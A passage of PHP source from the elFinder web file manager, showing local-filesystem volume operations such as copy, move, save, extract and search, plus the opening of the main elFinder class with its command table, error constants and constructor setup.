                        $dir = is_dir($target);
                        $stat['alias'] = $this->_path($target);
                        $stat['target'] = $target;
                        $stat['mime'] = $dir ? 'directory' : $this->mimetype($stat['alias']);
                    }
                } else {
                    if (($dir = $file->isDir()) && $this->options['detectDirIcon']) {
                        $path = $file->getPathname();
                        $favicon = $path . DIRECTORY_SEPARATOR . $this->options['detectDirIcon'];
                        if ($this->URL && file_exists($favicon)) {
                            $stat['icon'] = $this->URL . str_replace(DIRECTORY_SEPARATOR, '/', substr($favicon, strlen($this->root) + 1));
                        }
                    }
                    $stat['mime'] = $dir ? 'directory' : $this->mimetype($fpath);
                }
                $size = sprintf('%u', $file->getSize());
                $stat['ts'] = $file->getMTime();
                if (!$br) {
                    if ($this->statOwner && !$linkreadable) {
                        $uid = $file->getOwner();
                        $gid = $file->getGroup();
                        $stat['perm'] = substr((string)decoct($file->getPerms()), -4);
                        $stat = array_merge($stat, $this->getOwnerStat($uid, $gid));
                    }
                    $stat['read'] = ($linkreadable || $file->isReadable()) ? null : false;
                    $stat['write'] = $file->isWritable() ? null : false;
                    $stat['locked'] = $dirWritable ? null : true;
                    if (is_null($stat['read'])) {
                        $stat['size'] = $dir ? 0 : $size;
                    }
                    if ($this->options['statCorrector']) {
                        call_user_func_array($this->options['statCorrector'], array(&$stat, $fpath, $this->statOwner, $this));
                    }
                }
                $cache[] = array($fpath, $stat);
            } catch (RuntimeException $e) {
                continue;
            }
        }
        if ($cache) {
            $cache = $this->convEncOut($cache, false);
            foreach ($cache as $d) {
                $this->updateCache($d[0], $d[1]);
            }
        }
        return $files;
    }

    protected function _fopen($path, $mode = 'rb')
    {
        return fopen($path, $mode);
    }

    protected function _fclose($fp, $path = '')
    {
        return (is_resource($fp) && fclose($fp));
    }

    protected function _mkdir($path, $name)
    {
        $path = $this->_joinPath($path, $name);
        if (mkdir($path)) {
            chmod($path, $this->options['dirMode']);
            return $path;
        }
        return false;
    }

    protected function _mkfile($path, $name)
    {
        $path = $this->_joinPath($path, $name);
        if (($fp = fopen($path, 'w'))) {
            fclose($fp);
            chmod($path, $this->options['fileMode']);
            return $path;
        }
        return false;
    }

    protected function _symlink($source, $targetDir, $name)
    {
        return $this->localFileSystemSymlink($source, $this->_joinPath($targetDir, $name));
    }

    protected function _copy($source, $targetDir, $name)
    {
        $mtime = filemtime($source);
        $target = $this->_joinPath($targetDir, $name);
        if ($ret = copy($source, $target)) {
            isset($this->options['keepTimestamp']['copy']) && $mtime && touch($target, $mtime);
        }
        return $ret;
    }

    protected function _move($source, $targetDir, $name)
    {
        $mtime = filemtime($source);
        $target = $this->_joinPath($targetDir, $name);
        if ($ret = rename($source, $target) ? $target : false) {
            isset($this->options['keepTimestamp']['move']) && $mtime && touch($target, $mtime);
        }
        return $ret;
    }

    protected function _unlink($path)
    {
        return is_file($path) && unlink($path);
    }

    protected function _rmdir($path)
    {
        return rmdir($path);
    }

    protected function _save($fp, $dir, $name, $stat)
    {
        $path = $this->_joinPath($dir, $name);
        $meta = stream_get_meta_data($fp);
        $uri = isset($meta['uri']) ? $meta['uri'] : '';
        if ($uri && !preg_match('#^[a-zA-Z0-9]+://#', $uri) && !is_link($uri)) {
            fclose($fp);
            $mtime = filemtime($uri);
            $isCmdPaste = ($this->ARGS['cmd'] === 'paste');
            $isCmdCopy = ($isCmdPaste && empty($this->ARGS['cut']));
            if (($isCmdCopy || !rename($uri, $path)) && !copy($uri, $path)) {
                return false;
            }
            if ($mtime && $this->ARGS['cmd'] === 'upload') {
                touch($path, isset($this->options['keepTimestamp']['upload']) ? $mtime : time());
            }
        } else {
            if (file_put_contents($path, $fp, LOCK_EX) === false) {
                return false;
            }
        }
        chmod($path, $this->options['fileMode']);
        return $path;
    }

    protected function _getContents($path)
    {
        return file_get_contents($path);
    }

    protected function _filePutContents($path, $content)
    {
        return (file_put_contents($path, $content, LOCK_EX) !== false);
    }

    protected function _checkArchivers()
    {
        $this->archivers = $this->getArchivers();
        return;
    }

    protected function _chmod($path, $mode)
    {
        $modeOct = is_string($mode) ? octdec($mode) : octdec(sprintf("%04o", $mode));
        return chmod($path, $modeOct);
    }

    protected function _findSymlinks($path)
    {
        return self::localFindSymlinks($path);
    }

    protected function _extract($path, $arc)
    {
        if ($this->quarantine) {
            $dir = $this->quarantine . DIRECTORY_SEPARATOR . md5(basename($path) . mt_rand());
            $archive = (isset($arc['toSpec']) || $arc['cmd'] === 'phpfunction') ? '' : $dir . DIRECTORY_SEPARATOR . basename($path);
            if (!mkdir($dir)) {
                return false;
            }
            register_shutdown_function(array($this, 'rmdirRecursive'), realpath($dir));
            chmod($dir, 0777);
            if (!is_readable($path) || ($archive && !copy($path, $archive))) {
                return false;
            }
            try {
                $this->unpackArchive($path, $arc, $archive ? true : $dir);
            } catch(Exception $e) {
                return $this->setError($e->getMessage());
            }
            try {
                $ls = self::localScandir($dir);
            } catch (Exception $e) {
                return false;
            }
            if (empty($ls)) {
                return false;
            }
            $this->archiveSize = 0;
            $checkRes = $this->checkExtractItems($dir);
            if ($checkRes['symlinks']) {
                self::localRmdirRecursive($dir);
                return $this->setError(array_merge($this->error, array(elFinder::ERROR_ARC_SYMLINKS)));
            }
            $this->archiveSize = $checkRes['totalSize'];
            if ($checkRes['rmNames']) {
                foreach ($checkRes['rmNames'] as $name) {
                    $this->addError(elFinder::ERROR_SAVE, $name);
                }
            }
            if ($this->options['maxArcFilesSize'] > 0 && $this->options['maxArcFilesSize'] < $this->archiveSize) {
                $this->delTree($dir);
                return $this->setError(elFinder::ERROR_ARC_MAXSIZE);
            }
            $extractTo = $this->extractToNewdir;
            $name = '';
            $src = $dir . DIRECTORY_SEPARATOR . $ls[0];
            if (($extractTo === 'auto' || !$extractTo) && count($ls) === 1 && is_file($src)) {
                $name = $ls[0];
            } else if ($extractTo === 'auto' || $extractTo) {
                $src = $dir;
                $splits = elFinder::splitFileExtention(basename($path));
                $name = $splits[0];
                $test = dirname($path) . DIRECTORY_SEPARATOR . $name;
                if (file_exists($test) || is_link($test)) {
                    $name = $this->uniqueName(dirname($path), $name, '-', false);
                }
            }
            if ($name !== '') {
                $result = dirname($path) . DIRECTORY_SEPARATOR . $name;
                if (!rename($src, $result)) {
                    $this->delTree($dir);
                    return false;
                }
            } else {
                $dstDir = dirname($path);
                $result = array();
                foreach ($ls as $name) {
                    $target = $dstDir . DIRECTORY_SEPARATOR . $name;
                    if (self::localMoveRecursive($dir . DIRECTORY_SEPARATOR . $name, $target, true, $this->options['copyJoin'])) {
                        $result[] = $target;
                    }
                }
                if (!$result) {
                    $this->delTree($dir);
                    return false;
                }
            }
            is_dir($dir) && $this->delTree($dir);
            return (is_array($result) || file_exists($result)) ? $result : false;
        }
        return false;
    }

    protected function _archive($dir, $files, $name, $arc)
    {
        return $this->makeArchive($dir, $files, $name, $arc);
    }

    protected function getWorkFile($path)
    {
        return $path;
    }

    protected function delTree($localpath)
    {
        return $this->rmdirRecursive($localpath);
    }

    protected function isNameExists($path)
    {
        $exists = file_exists($this->convEncIn($path));
        $this->convEncOut();
        return $exists ? $this->stat($path) : false;
    }

    protected function doSearch($path, $q, $mimes)
    {
        if (!empty($this->doSearchCurrentQuery['matchMethod']) || $this->encoding || !class_exists('FilesystemIterator', false)) {
            return parent::doSearch($path, $q, $mimes);
        }
        $result = array();
        $timeout = $this->options['searchTimeout'] ? $this->searchStart + $this->options['searchTimeout'] : 0;
        if ($timeout && $timeout < time()) {
            $this->setError(elFinder::ERROR_SEARCH_TIMEOUT, $this->path($this->encode($path)));
            return $result;
        }
        elFinder::extendTimeLimit($this->options['searchTimeout'] + 30);
        $match = array();
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveCallbackFilterIterator(
                    new RecursiveDirectoryIterator($path,
                        FilesystemIterator::KEY_AS_PATHNAME |
                        FilesystemIterator::SKIP_DOTS |
                        ((defined('RecursiveDirectoryIterator::FOLLOW_SYMLINKS') && $this->options['followSymLinks']) ?
                            RecursiveDirectoryIterator::FOLLOW_SYMLINKS : 0)
                    ),
                    array($this, 'localFileSystemSearchIteratorFilter')
                ),
                RecursiveIteratorIterator::SELF_FIRST,
                RecursiveIteratorIterator::CATCH_GET_CHILD
            );
            foreach ($iterator as $key => $node) {
                if ($timeout && ($this->error || $timeout < time())) {
                    !$this->error && $this->setError(elFinder::ERROR_SEARCH_TIMEOUT, $this->path($this->encode($node->getPath)));
                    break;
                }
                if ($node->isDir()) {
                    if ($this->stripos($node->getFilename(), $q) !== false) {
                        $match[] = $key;
                    }
                } else {
                    $match[] = $key;
                }
            }
        } catch (Exception $e) {
        }
        if ($match) {
            foreach ($match as $p) {
                if ($timeout && ($this->error || $timeout < time())) {
                    !$this->error && $this->setError(elFinder::ERROR_SEARCH_TIMEOUT, $this->path($this->encode(dirname($p))));
                    break;
                }
                $stat = $this->stat($p);
                if (!$stat) {
                    continue;
                }
                if (!empty($stat['hidden']) || !$this->mimeAccepted($stat['mime'], $mimes)) {
                    continue;
                }
                if ((!$mimes || $stat['mime'] !== 'directory')) {
                    $stat['path'] = $this->path($stat['hash']);
                    if ($this->URL && !isset($stat['url'])) {
                        $_path = str_replace(DIRECTORY_SEPARATOR, '/', substr($p, strlen($this->root) + 1));
                        $stat['url'] = $this->URL . str_replace('%2F', '/', rawurlencode($_path));
                    }
                    $result[] = $stat;
                }
            }
        }
        return $result;
    }

    public function localFileSystemSearchIteratorFilter($file, $key, $iterator)
    {
        $name = $file->getFilename();
        if ($this->doSearchCurrentQuery['excludes']) {
            foreach ($this->doSearchCurrentQuery['excludes'] as $exclude) {
                if ($this->stripos($name, $exclude) !== false) {
                    return false;
                }
            }
        }
        if ($iterator->hasChildren()) {
            if ($this->options['searchExDirReg'] && preg_match($this->options['searchExDirReg'], $key)) {
                return false;
            }
            return (bool)$this->attr($key, 'read', null, true);
        }
        return ($this->stripos($name, $this->doSearchCurrentQuery['q']) === false) ? false : true;
    }

    protected function localFileSystemSymlink($target, $link)
    {
        $res = false;
        if (function_exists('symlink') and is_callable('symlink')) {
            $errlev = error_reporting();
            error_reporting($errlev ^ E_WARNING);
            if ($res = symlink(realpath($target), $link)) {
                $res = is_readable($link);
            }
            error_reporting($errlev);
        }
        return $res;
    }
} // END class elFinderVolumeLocalFileSystem
} // END if !class_exists
/* ===================== [embedded] elFinder ===================== */
if (!class_exists('elFinder', false)) {
class elFinder
{
    protected static $ApiVersion = 2.1;
    protected $version;
    protected static $ApiRevision = 66;
    protected $volumes = array();
    public static $instance = null;
    public static $currentArgs = array();
    public static $netDrivers = array();
    public static $locale = '';
    public static $defaultMimefile = '';
    public static $tmpLinkPath = '';
    public static $tmpLinkUrl = '';
    public static $tmpLinkLifeTime = 3600;
    public static $textMimes = array(
        'application/dash+xml', 'application/docbook+xml', 'application/javascript',
        'application/json', 'application/plt', 'application/sat', 'application/sql',
        'application/step', 'application/vnd.hp-hpgl', 'application/x-awk',
        'application/x-config', 'application/x-csh', 'application/x-empty',
        'application/x-mpegurl', 'application/x-perl', 'application/x-php',
        'application/x-web-config', 'application/xhtml+xml', 'application/xml',
        'audio/x-mp3-playlist', 'image/cgm', 'image/svg+xml', 'image/vnd.dxf', 'model/iges'
    );
    public static $memoryLimitGD = 0;
    protected static $abortCheckFile = null;
    protected $session;
    public static $sessionCacheKey = '';
    private static $sessionClosed = false;
    protected static $base64encodeSessionData = false;
    protected static $commonTempPath = '';
    protected $urlUploadFilter = null;
    protected static $connectionFlagsPath = '';
    protected $optionsNetVolumes = array();
    protected $netVolumesSessionKey = '';
    public static $volumesCnt = 1;
    protected $default = null;

    protected $commands = array(
        'abort' => array('id' => true),
        'archive' => array('targets' => true, 'type' => true, 'mimes' => false, 'name' => false),
        'callback' => array('node' => true, 'json' => false, 'bind' => false, 'done' => false),
        'chmod' => array('targets' => true, 'mode' => true),
        'dim' => array('target' => true, 'substitute' => false),
        'duplicate' => array('targets' => true, 'suffix' => false),
        'editor' => array('name' => true, 'method' => true, 'args' => false),
        'extract' => array('target' => true, 'mimes' => false, 'makedir' => false),
        'file' => array('target' => true, 'download' => false, 'cpath' => false, 'onetime' => false),
        'get' => array('target' => true, 'conv' => false),
        'info' => array('targets' => true, 'compare' => false),
        'ls' => array('target' => true, 'mimes' => false, 'intersect' => false),
        'mkdir' => array('target' => true, 'name' => false, 'dirs' => false),
        'mkfile' => array('target' => true, 'name' => true, 'mimes' => false),
        'netmount' => array('protocol' => true, 'host' => true, 'path' => false, 'port' => false, 'user' => false, 'pass' => false, 'alias' => false, 'options' => false),
        'open' => array('target' => false, 'tree' => false, 'init' => false, 'mimes' => false, 'compare' => false),
        'parents' => array('target' => true, 'until' => false),
        'paste' => array('dst' => true, 'targets' => true, 'cut' => false, 'mimes' => false, 'renames' => false, 'hashes' => false, 'suffix' => false),
        'put' => array('target' => true, 'content' => '', 'mimes' => false, 'encoding' => false),
        'rename' => array('target' => true, 'name' => true, 'mimes' => false, 'targets' => false, 'q' => false),
        'resize' => array('target' => true, 'width' => false, 'height' => false, 'mode' => false, 'x' => false, 'y' => false, 'degree' => false, 'quality' => false, 'bg' => false),
        'rm' => array('targets' => true),
        'search' => array('q' => true, 'mimes' => false, 'target' => false, 'type' => false),
        'size' => array('targets' => true),
        'subdirs' => array('targets' => true),
        'tmb' => array('targets' => true),
        'tree' => array('target' => true),
        'upload' => array('target' => true, 'FILES' => true, 'mimes' => false, 'html' => false, 'upload' => false, 'name' => false, 'upload_path' => false, 'chunk' => false, 'cid' => false, 'node' => false, 'renames' => false, 'hashes' => false, 'suffix' => false, 'mtime' => false, 'overwrite' => false, 'contentSaveId' => false),
        'url' => array('target' => true, 'options' => false),
        'zipdl' => array('targets' => true, 'download' => false)
    );

    protected $plugins = array();
    protected $listeners = array();
    protected $time = 0;
    protected $loaded = false;
    protected $debug = false;
    protected $sessionCloseEarlier = true;
    protected $sessionUseCmds = array();
    protected $timeout = 0;
    protected $uploadTempPath = '';
    protected $maxArcFilesSize = 0;
    protected $uploadDebug = '';
    public $maxTargets = 1000;
    public static $phpErrors = array();
    public $mountErrors = array();
    public static $archivers = array();
    protected $callbackWindowURL = '';
    protected $autoUnlocks = array();
    protected $itemLockExpire = 3600;
    protected $customData = null;
    protected $removeContentSaveIds = array();
    protected $uploadAllowedLanIpClasses = array();
    protected $throwErrorOnExec = false;
    protected $toastParamsDefault = array('mode' => 'warning', 'prefix' => '');
    private $toastParams = array();
    private $toastMessages = array();
    private $utf8Encoder = null;
    private static $seekableUrlFps = array();

    const ERROR_ACCESS_DENIED = 'errAccess';
    const ERROR_ARC_MAXSIZE = 'errArcMaxSize';
    const ERROR_ARC_SYMLINKS = 'errArcSymlinks';
    const ERROR_ARCHIVE = 'errArchive';
    const ERROR_ARCHIVE_EXEC = 'errArchiveExec';
    const ERROR_ARCHIVE_TYPE = 'errArcType';
    const ERROR_CONF = 'errConf';
    const ERROR_CONF_NO_JSON = 'errJSON';
    const ERROR_CONF_NO_VOL = 'errNoVolumes';
    const ERROR_CONV_UTF8 = 'errConvUTF8';
    const ERROR_COPY = 'errCopy';
    const ERROR_COPY_FROM = 'errCopyFrom';
    const ERROR_COPY_ITSELF = 'errCopyInItself';
    const ERROR_COPY_TO = 'errCopyTo';
    const ERROR_CREATING_TEMP_DIR = 'errCreatingTempDir';
    const ERROR_DIR_NOT_FOUND = 'errFolderNotFound';
    const ERROR_EXISTS = 'errExists';
    const ERROR_EXTRACT = 'errExtract';
    const ERROR_EXTRACT_EXEC = 'errExtractExec';
    const ERROR_FILE_NOT_FOUND = 'errFileNotFound';
    const ERROR_FTP_DOWNLOAD_FILE = 'errFtpDownloadFile';
    const ERROR_FTP_MKDIR = 'errFtpMkdir';
    const ERROR_FTP_UPLOAD_FILE = 'errFtpUploadFile';
    const ERROR_INV_PARAMS = 'errCmdParams';
    const ERROR_INVALID_DIRNAME = 'errInvDirname';
    const ERROR_INVALID_NAME = 'errInvName';
    const ERROR_LOCKED = 'errLocked';
    const ERROR_MAX_TARGTES = 'errMaxTargets';
    const ERROR_MKDIR = 'errMkdir';
    const ERROR_MKFILE = 'errMkfile';
    const ERROR_MKOUTLINK = 'errMkOutLink';
    const ERROR_MOVE = 'errMove';
    const ERROR_NETMOUNT = 'errNetMount';
    const ERROR_NETMOUNT_FAILED = 'errNetMountFailed';
    const ERROR_NETMOUNT_NO_DRIVER = 'errNetMountNoDriver';
    const ERROR_NETUNMOUNT = 'errNetUnMount';
    const ERROR_NOT_ARCHIVE = 'errNoArchive';
    const ERROR_NOT_DIR = 'errNotFolder';
    const ERROR_NOT_FILE = 'errNotFile';
    const ERROR_NOT_REPLACE = 'errNotReplace';
    const ERROR_NOT_UTF8_CONTENT = 'errNotUTF8Content';
    const ERROR_OPEN = 'errOpen';
    const ERROR_PERM_DENIED = 'errPerm';
    const ERROR_REAUTH_REQUIRE = 'errReauthRequire';
    const ERROR_RENAME = 'errRename';
    const ERROR_REPLACE = 'errReplace';
    const ERROR_RESIZE = 'errResize';
    const ERROR_RESIZESIZE = 'errResizeSize';
    const ERROR_RM = 'errRm';
    const ERROR_RM_SRC = 'errRmSrc';
    const ERROR_SAVE = 'errSave';
    const ERROR_SEARCH_TIMEOUT = 'errSearchTimeout';
    const ERROR_SESSION_EXPIRES = 'errSessionExpires';
    const ERROR_TRGDIR_NOT_FOUND = 'errTrgFolderNotFound';
    const ERROR_UNKNOWN = 'errUnknown';
    const ERROR_UNKNOWN_CMD = 'errUnknownCmd';
    const ERROR_UNSUPPORT_TYPE = 'errUsupportType';
    const ERROR_UPLOAD = 'errUpload';
    const ERROR_UPLOAD_FILE = 'errUploadFile';
    const ERROR_UPLOAD_FILE_MIME = 'errUploadMime';
    const ERROR_UPLOAD_FILE_SIZE = 'errUploadFileSize';
    const ERROR_UPLOAD_NO_FILES = 'errUploadNoFiles';
    const ERROR_UPLOAD_TEMP = 'errUploadTemp';
    const ERROR_UPLOAD_TOTAL_SIZE = 'errUploadTotalSize';
    const ERROR_UPLOAD_TRANSFER = 'errUploadTransfer';
    const ERROR_MAX_MKDIRS = 'errMaxMkdirs';

    public function __construct($opts)
    {
        if (version_compare(PHP_VERSION, '5.6', '>=')) {
            if (($_val = ini_get('iconv.internal_encoding')) && strtoupper($_val) !== 'UTF-8') {
                ini_set('iconv.internal_encoding', '');
            }
            if (($_val = ini_get('mbstring.internal_encoding')) && strtoupper($_val) !== 'UTF-8') {
                ini_set('mbstring.internal_encoding', '');
            }
            if (($_val = ini_get('internal_encoding')) && strtoupper($_val) !== 'UTF-8') {
                ini_set('internal_encoding', '');
            }
        } else {
            if (function_exists('iconv_set_encoding') && strtoupper(iconv_get_encoding('internal_encoding')) !== 'UTF-8') {
                iconv_set_encoding('internal_encoding', 'UTF-8');
            }
            if (function_exists('mb_internal_encoding') && strtoupper(mb_internal_encoding()) !== 'UTF-8') {
                mb_internal_encoding('UTF-8');
            }
        }
        ini_set('default_charset', 'UTF-8');

        !defined('ELFINDER_TAR_PATH') && define('ELFINDER_TAR_PATH', 'tar');
        !defined('ELFINDER_GZIP_PATH') && define('ELFINDER_GZIP_PATH', 'gzip');
        !defined('ELFINDER_BZIP2_PATH') && define('ELFINDER_BZIP2_PATH', 'bzip2');
        !defined('ELFINDER_XZ_PATH') && define('ELFINDER_XZ_PATH', 'xz');
        !defined('ELFINDER_ZIP_PATH') && define('ELFINDER_ZIP_PATH', 'zip');
        !defined('ELFINDER_UNZIP_PATH') && define('ELFINDER_UNZIP_PATH', 'unzip');
        !defined('ELFINDER_RAR_PATH') && define('ELFINDER_RAR_PATH', 'rar');
        !defined('ELFINDER_RAR_MA4') && define('ELFINDER_RAR_MA4', false);
        !defined('ELFINDER_UNRAR_PATH') && define('ELFINDER_UNRAR_PATH', 'unrar');
        !defined('ELFINDER_7Z_PATH') && define('ELFINDER_7Z_PATH', (substr(PHP_OS, 0, 3) === 'WIN') ? '7z' : '7za');
        !defined('ELFINDER_CONVERT_PATH') && define('ELFINDER_CONVERT_PATH', 'convert');
        !defined('ELFINDER_IDENTIFY_PATH') && define('ELFINDER_IDENTIFY_PATH', 'identify');
        !defined('ELFINDER_EXIFTRAN_PATH') && define('ELFINDER_EXIFTRAN_PATH', 'exiftran');
        !defined('ELFINDER_JPEGTRAN_PATH') && define('ELFINDER_JPEGTRAN_PATH', 'jpegtran');
        !defined('ELFINDER_FFMPEG_PATH') && define('ELFINDER_FFMPEG_PATH', 'ffmpeg');
        !defined('ELFINDER_DISABLE_ZIPEDITOR') && define('ELFINDER_DISABLE_ZIPEDITOR', false);
        !defined('ELFINDER_IMAGEMAGICK_PS') && define('ELFINDER_IMAGEMAGICK_PS', false);

        $this->version = (string)self::$ApiVersion;

        $errLevel = E_WARNING | E_NOTICE | E_USER_WARNING | E_USER_NOTICE | E_RECOVERABLE_ERROR;
        if (defined('E_DEPRECATED')) {
            $errLevel |= E_DEPRECATED | E_USER_DEPRECATED;
        }
        if (defined('E_STRICT')) {
            $errLevel |= @E_STRICT;
        }
        set_error_handler('elFinder::phpErrorHandler', $errLevel);

        $GLOBALS['elFinderTempFps'] = array();
        $GLOBALS['elFinderTempFiles'] = array();
        $GLOBALS['elFinderAbortFiles'] = array();
        register_shutdown_function(array('elFinder', 'onShutdown'));

        if (!empty($_SERVER['PATH_INFO'])) {
            $_ps = explode('/', trim($_SERVER['PATH_INFO'], '/'));
            if (!isset($_GET['cmd'])) {
                $_cmd = $_ps[0];
                if (isset($this->commands[$_cmd])) {
                    $_GET['cmd'] = $_cmd;
                    $_i = 1;
                    foreach (array_keys($this->commands[$_cmd]) as $_k) {
                        if (isset($_ps[$_i])) {
                            if (!isset($_GET[$_k])) {
                                $_GET[$_k] = $_ps[$_i++];
                            }
                        } else {
                            break;
                        }
                    }
                }
            }
        }

        elFinder::$instance = $this;

        $this->debug = (isset($opts['debug']) && $opts['debug'] ? true : false);
        if ($this->debug) {
            error_reporting(defined('ELFINDER_DEBUG_ERRORLEVEL') ? ELFINDER_DEBUG_ERRORLEVEL : -1);
            ini_set('display_errors', '1');
            while (ob_get_level() && ob_end_clean()) {}
        }

        if (!interface_exists('elFinderSessionInterface')) {
            include_once dirname(__FILE__) . '/elFinderSessionInterface.php';
        }

        if (!empty($opts['session']) && $opts['session'] instanceof elFinderSessionInterface) {
            $this->session = $opts['session'];
        } else {
            $sessionOpts = array(
                'base64encode' => !empty($opts['base64encodeSessionData']),
                'keys' => array(
                    'default' => !empty($opts['sessionCacheKey']) ? $opts['sessionCacheKey'] : 'elFinderCaches',
                    'netvolume' => !empty($opts['netVolumesSessionKey']) ? $opts['netVolumesSessionKey'] : 'elFinderNetVolumes'
                )
            );
            if (!class_exists('elFinderSession')) {
                include_once dirname(__FILE__) . '/elFinderSession.php';
            }
            $this->session = new elFinderSession($sessionOpts);
        }
        $this->session->start();

        $sessionUseCmds = array('netmount');
        if (isset($opts['sessionUseCmds']) && is_array($opts['sessionUseCmds'])) {
            $sessionUseCmds = array_merge($sessionUseCmds, $opts['sessionUseCmds']);
        }

        if (isset($_SERVER['HTTP_X_ELFINDER_VOLUMESCNTSTART']) && ($volumesCntStart = intval($_SERVER['HTTP_X_ELFINDER_VOLUMESCNTSTART']))) {
            self::$volumesCnt = $volumesCntStart;
        }

        $this->time = $this->utime();
        $this->sessionCloseEarlier = isset($opts['sessionCloseEarlier']) ? (bool)$opts['sessionCloseEarlier'] : true;
        $this->sessionUseCmds = array_flip($sessionUseCmds);
        $this->timeout = (isset($opts['timeout']) ? $opts['timeout'] : 0);
        $this->uploadTempPath = (isset($opts['uploadTempPath']) ? $opts['uploadTempPath'] : '');
        $this->callbackWindowURL = (isset($opts['callbackWindowURL']) ? $opts['callbackWindowURL'] : '');
        $this->maxTargets = (isset($opts['maxTargets']) ? intval($opts['maxTargets']) : $this->maxTargets);
        elFinder::$commonTempPath = (isset($opts['commonTempPath']) ? realpath($opts['commonTempPath']) : dirname(__FILE__) . '/.tmp');
        if (!is_writable(elFinder::$commonTempPath)) {
            elFinder::$commonTempPath = sys_get_temp_dir();
            if (!is_writable(elFinder::$commonTempPath)) {
                elFinder::$commonTempPath = '';
            }
        }
        if (isset($opts['connectionFlagsPath']) && is_writable($opts['connectionFlagsPath'] = realpath($opts['connectionFlagsPath']))) {
            elFinder::$connectionFlagsPath = $opts['connectionFlagsPath'];
        } else {
            elFinder::$connectionFlagsPath = elFinder::$commonTempPath;
        }

        if (!empty($opts['tmpLinkPath'])) {
            elFinder::$tmpLinkPath = realpath($opts['tmpLinkPath']);
        }
        if (!empty($opts['tmpLinkUrl'])) {
            elFinder::$tmpLinkUrl = $opts['tmpLinkUrl'];
        }
        if (!empty($opts['tmpLinkLifeTime'])) {
            elFinder::$tmpLinkLifeTime = $opts['tmpLinkLifeTime'];
        }
        if (!empty($opts['textMimes']) && is_array($opts['textMimes'])) {
            elfinder::$textMimes = $opts['textMimes'];
        }
        if (!empty($opts['urlUploadFilter'])) {
            $this->urlUploadFilter = $opts['urlUploadFilter'];
        }
        $this->maxArcFilesSize = isset($opts['maxArcFilesSize']) ? intval($opts['maxArcFilesSize']) : 0;
        $this->optionsNetVolumes = (isset($opts['optionsNetVolumes']) && is_array($opts['optionsNetVolumes'])) ? $opts['optionsNetVolumes'] : array();
        if (isset($opts['itemLockExpire'])) {
            $this->itemLockExpire = intval($opts['itemLockExpire']);
        }

        if (!empty($opts['uploadAllowedLanIpClasses'])) {
            $this->uploadAllowedLanIpClasses = array_flip($opts['uploadAllowedLanIpClasses']);
        }

        $this->netVolumesSessionKey = !empty($opts['netVolumesSessionKey']) ? $opts['netVolumesSessionKey'] : 'elFinderNetVolumes';
        self::$sessionCacheKey = !empty($opts['sessionCacheKey']) ? $opts['sessionCacheKey'] : 'elFinderCaches';

        $_optsMD5 = md5(json_encode($opts['roots']));
        if ($this->session->get('_optsMD5') !== $_optsMD5) {
            $this->session->set('_optsMD5', $_optsMD5);
        }

        self::$locale = !empty($opts['locale']) ? $opts['locale'] : (substr(PHP_OS, 0, 3) === 'WIN' ? 'C' : 'en_US.UTF-8');
        if (false === setlocale(LC_ALL, self::$locale)) {
            self::$locale = setlocale(LC_ALL, '0');
        }

        elFinder::$defaultMimefile = isset($opts['defaultMimefile']) ? $opts['defaultMimefile'] : '';
        elFinder::$memoryLimitGD = isset($opts['memoryLimitGD']) ? $opts['memoryLimitGD'] : 0;
        $this->throwErrorOnExec = !empty($opts['throwErrorOnExec']);
        elFinder::$archivers = isset($opts['archivers']) && is_array($opts['archivers']) ? $opts['archivers'] : array();

        if (isset($opts['utf8Encoder']) && is_callable($opts['utf8Encoder'])) {
            $this->utf8Encoder = $opts['utf8Encoder'];
        }

        if (DIRECTORY_SEPARATOR !== '/') {
            if (empty($opts['bind'])) {
                $opts['bind'] = array();
            }
            $_key = 'upload.pre mkdir.pre mkfile.pre rename.pre archive.pre ls.pre';
            if (!isset($opts['bind'][$_key])) {
                $opts['bind'][$_key] = array();
            }
            array_push($opts['bind'][$_key], 'Plugin.WinRemoveTailDots.cmdPreprocess');
            $_key = 'upload.presave paste.copyfrom';
            if (!isset($opts['bind'][$_key])) {
                $opts['bind'][$_key] = array();
            }
            array_push($opts['bind'][$_key], 'Plugin.WinRemoveTailDots.onUpLoadPreSave');
        }

        if (!empty($opts['bind']) && is_array($opts['bind'])) {
            $_req = $_SERVER["REQUEST_METHOD"] == 'POST' ? $_POST : $_GET;
            $_reqCmd = isset($_req['cmd']) ? $_req['cmd'] : '';
            foreach ($opts['bind'] as $cmd => $handlers) {
                $doRegist = (strpos($cmd, '*') !== false);
                if (!$doRegist) {
                    $doRegist = ($_reqCmd && in_array($_reqCmd, array_map('elFinder::getCmdOfBind', explode(' ', $cmd))));
                }
                if ($doRegist) {
                    if (!is_array($handlers)) {
                        $handlers = array($handlers);
                    } else {
                        if (count($handlers) === 2 && is_callable($handlers)) {
                            $handlers = array($handlers);
                        }
                    }
                    foreach ($handlers as $handler) {
                        if ($handler) {
                            if (is_string($handler) && strpos($handler, '.')) {
                                list($_domain, $_name, $_method) = array_pad(explode('.', $handler), 3, '');
                                if (strcasecmp($_domain, 'plugin') === 0) {
                                    if ($plugin = $this->getPluginInstance($_name, isset($opts['plugin'][$_name]) ? $opts['plugin'][$_name] : array())
                                        and method_exists($plugin, $_method)) {
                                        $this->bind($cmd, array($plugin, $_method));
                                    }
                                }
                            } else {
                                $this->bind($cmd, $handler);
                            }
                        }
                    }
                }
            }
        }

        if (!isset($opts['roots']) || !is_array($opts['roots'])) {
            $opts['roots'] = array();
        }

        if (empty(elFinder::$netDrivers['ziparchive'])) {
            elFinder::$netDrivers['ziparchive'] = 'FlysystemZipArchiveNetmount';
        }

        $netVolumes = $this->getNetVolumes();
        foreach ($netVolumes as $key => $root) {
            if (!isset($root['id'])) {
                if (!$root['id'] = $this->getNetVolumeUniqueId($netVolumes)) {
                    $this->mountErrors[] = 'Netmount Driver "' . $root['driver'] . '" : Could\'t given volume id.';
                    continue;
                }
            }
            $root['_isNetVolume'] = true;
            $opts['roots'][$key] = $root;
        }

        foreach ($opts['roots'] as $i => $o) {
            $class = 'elFinderVolume' . (isset($o['driver']) ? $o['driver'] : '');
            if (class_exists($class)) {
                $volume = new $class();
                try {
                    if ($this->maxArcFilesSize && (empty($o['maxArcFilesSize']) || $this->maxArcFilesSize < $o['maxArcFilesSize'])) {
                        $o['maxArcFilesSize'] = $this->maxArcFilesSize;
                    }
                    $volume->setSession($this->session);
                    if (!$this->default) {
                        $volume->setNeedOnline(true);
                    }
                    if ($volume->mount($o)) {
                        $id = $volume->id();
                        $this->volumes[$id] = $volume;
                        if ((!$this->default || $volume->root() !== $volume->defaultPath()) && $volume->isReadable()) {
                            $this->default = $volume;
                        }
                    } else {
                        if (!empty($o['_isNetVolume'])) {
